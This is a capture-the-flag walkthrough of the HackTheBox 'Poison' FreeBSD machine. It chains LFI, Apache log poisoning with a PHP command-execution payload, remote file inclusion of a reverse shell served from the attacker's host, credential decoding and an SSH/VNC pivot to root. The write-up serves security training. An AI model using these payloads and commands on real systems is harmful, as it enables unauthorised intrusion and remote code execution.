+++
date = "2025-10-01T00:00:00+00:00"
lastmod = "2025-10-01T00:00:00+00:00"
draft = false
title = "HackTheBox: Poison Walkthrough"
description = "Detailed walkthrough of the Poison machine (10.10.10.84) covering LFI log poisoning, PHP RFI exploitation, credential recovery and a VNC pivot to root."
summary = "Defeat HackTheBox Poison by chaining PHP log poisoning, reverse shelling, Base64 credential digging and an SSH/VNC pivot to root."
keywords = ["hackthebox poison","lfi","log poisoning","reverse shell","base64 decode","vnc pivot","freebsd","htb"]
tags = ["hackthebox","web-exploitation","lfi","reverse-shell","privilege-escalation"]
categories = ["HackTheBox"]
author = "realspaceeagle"
image = "/images/poison-htb/poison-browse-interface.png"
+++

Poison is a classic FreeBSD target where a seemingly innocuous PHP file browser turns into an LFI playground, then a remote file include launchpad and finally a VNC-based root shell. Below is the run‑book I used, enriched with notes, command snippets and the screenshots exported from my original field notes.

## Timeline

| T+ (hh:mm) | Action |
|-----------|--------|
| 00:00 | Launch full TCP/UDP discovery with `nmap` to map exposed services (22, 25, 80, 110, 119 and a few localhost-only ports). |
| 00:08 | Enumerate port 80 with Gobuster and discover `browse.php`, a file browser vulnerable to LFI. |
| 00:15 | Leak PHP source via `php://filter` and confirm log poisoning works against Apache access logs. |
| 00:24 | Serve a malicious PHP payload and include it through the poisoned log to obtain a shell. |
| 00:33 | Swap to a more stable reverse shell and enumerate credentials as `www`. |
| 00:41 | Decode the heavily base64-layered password for user `charix` and retrieve `secrets.dump`. |
| 00:52 | Establish an SSH SOCKS tunnel and pivot RFB traffic to VNC running as root. |
| 01:02 | Decrypt the VNC password, connect through the tunnel and capture the root flag. |

---

## Reconnaissance

```bash
mkdir -p ~/htb/poison/nmap
cd ~/htb/poison
sudo nmap -sC -sV -oA nmap/poison 10.10.10.84
nmap -p- -oA nmap/all-ports -vvv 10.10.10.84
nmap -sC -sV -p 22,25,80,110,119 10.10.10.84
```

The host is FreeBSD with SSH, SMTP and POP/NNTP exposed. Port 80 (`Apache/2.4.29`) became our main focus.

## Web Enumeration

Run a content brute-force and note an interesting file browser:

```bash
gobuster dir -u http://10.10.10.84 -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o gobuster-root.log
```

![browse.php file manager](/images/poison-htb/poison-browse-interface.png)

Beyond simple navigation, `browse.php` accepts a `file` parameter that we can point wherever we like. Local files are readable as rendered HTML, so `php://filter` attacks were the obvious next step.

## Local File Inclusion & Log Poisoning

Use the filter wrapper to base64-dump the PHP source:

```http
GET /browse.php?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
Host: 10.10.10.84
```

Decoding the response revealed that Apache access logs were included from `/var/log/httpd-access.log`. Inject a PHP payload into the log by visiting a crafted URL:

```bash
curl "http://10.10.10.84/browse.php?file=<?php system(\$_GET['cmd']); ?>"
```

Then request the log via LFI and execute commands:

```http
GET /browse.php?file=/var/log/httpd-access.log&cmd=id HTTP/1.1
```

![Decoded payload delivered through browse.php](/images/poison-htb/poison-upload-html.png)

## Remote File Include to Shell

Direct command execution was unstable, so I staged a remote file include. Serve the classic PentestMonkey reverse shell and load it through the poisoned log:

```bash
php -S 10.10.14.13:8000
curl "http://10.10.10.84/browse.php?file=http://10.10.14.13:8000/revshell.php"
```

![Triggering remote include](/images/poison-htb/poison-rfi-response.png)

Listen on Kali:

```bash
rlwrap nc -nlvp 9001
```

Within moments a shell popped as `www`. Upgrade it and pull in enumeration scripts.

![Interactive reverse shell](/images/poison-htb/poison-reverse-shell.png)

## Pivot to User `charix`

The home directory held a `pwd.txt` encoded thirteen times with Base64. A one-liner peeled back the layers:

```bash
data=$(cat pwd.txt); for i in $(seq 1 13); do data=$(echo $data | tr -d ' ' | base64 -d); done; echo $data
```

![Decoded password for charix](/images/poison-htb/poison-password-decode.png)

Armed with the password, SSH in and grab `secrets.dump` for later use.

![Copying secrets.dump](/images/poison-htb/poison-secrets-dump.png)

## VNC Pivot & Root Access

`/etc/rc.conf` and the process list showed `Xvnc` listening only on localhost (5801/5901). The dump also pointed at VNC credentials. Build a SOCKS tunnel and forward traffic:

```bash
ssh charix@10.10.10.84 -D 8081
proxychains vncviewer 127.0.0.1:5901 -passwd secret
```

![Socksified VNC connection](/images/poison-htb/poison-vnc-portforward.png)

![Decrypting the VNC password](/images/poison-htb/poison-vnc-decrypter.png)

After authenticating, the desktop revealed the root flag. Mission accomplished.

## Key Takeaways

- File browsers often double as LFI gadgets—check for `php://` wrappers and log inclusions.
- Layered base64 encoding is a common attempt at obfuscation. Automate the decode loop instead of doing it manually.
- FreeBSD services such as VNC frequently bind to localhost; SOCKS tunnels plus proxychains keep pivots painless.
- Always screenshot and document each pivot—future-you will appreciate the breadcrumbs.

Happy hacking!
